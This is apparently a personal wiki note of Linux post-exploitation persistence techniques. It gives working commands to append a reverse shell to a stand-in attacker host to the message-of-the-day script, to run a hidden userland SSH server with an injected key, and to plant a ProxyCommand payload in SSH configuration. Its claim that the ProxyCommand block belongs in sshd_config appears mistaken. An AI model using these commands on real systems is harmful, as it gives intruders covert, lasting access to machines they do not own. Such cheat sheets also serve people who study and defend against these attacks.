---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - network-protocols
  - ssh
  - linux
---
# Living off the Land

## 01 - Message of the Day (MOTD)

```
# cat >> /etc/update-motd.d/00-header << EOF
bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' &
EOF
```

## 02 - Run SSH Server as Userland

Instead of dropping external binaries, reverse shells, or modifying firewall configuration with elevated permissions. Just executing the SSH daemon service greater than port 1023 or allowing incoming network traffic depending on the firewall configuration (e.g. `8080` HTTP proxy) to setup a temporary working directory in a multiplexer ([[Tmux|`tmux`]] or [[Screen|`screen`]]) in the background.

```
$ mkdir -p ~/.ssh 2>/dev/null
ssh-keygen -q -N "" -t ed25519 -f sshd_key
cat sshd_key.pub >> ~/.ssh/authorized_keys
cat sshd_key && rm -f sshd_key
$(command -v sshd) -f /dev/null -o HostKey=$(pwd)/sshd_key -o GatewayPorts=yes -p 8080
```

## 03 - SSH Configuration File

Modify the SSH config file `~/.ssh/config` in user privileges.

```
Host *
	ProxyCommand /path/to/payload %h %p
```

Another is way to apply this globally to modify the SSH configuration file located in `/etc/ssh/sshd_config`.

> [!IMPORTANT] Elevated Privileges are Required
> Requires root permission to modify the file.

Add the lines below.

```
Host *
	ProxyCommand /path/to/payload %h %p
```

---
## References

### Backlinks

- [[Linux Post Exploitation Persistence References]]

### Source Repositories

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)